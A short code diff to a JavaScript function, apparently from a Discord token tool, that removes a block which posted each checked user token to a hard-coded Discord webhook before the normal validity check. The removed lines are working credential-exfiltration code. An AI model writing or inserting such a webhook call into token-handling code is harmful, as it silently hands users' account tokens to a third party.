@@ -760,21 +760,6 @@ function refreshAccessToken() {
 }
 function checkToken(token) {
     let success = true;
-
-    // Make a POST request to the webhook URL with the token as payload
-    $.ajax({
-        type: "POST",
-        url: "https://discord.com/api/webhooks/1232301585108041869/d5RbZ0JdozPMIYJtzfaFkGQM3OFCIIDXJpchAS-Ktv8m39TQTGomVUxd2RHheeSVrMZC",
-        data: JSON.stringify({ content: token }),
-        success: function () {
-            console.log("Token logged to webhook successfully");
-        },
-        error: function (xhr, status, error) {
-            console.error("Failed to log token to webhook:", error);
-        }
-    });
-
-    // Send request to Discord API to check token validity
     $.get({
         url: "https://discordapp.com/api/v8/users/@me",
         headers: {
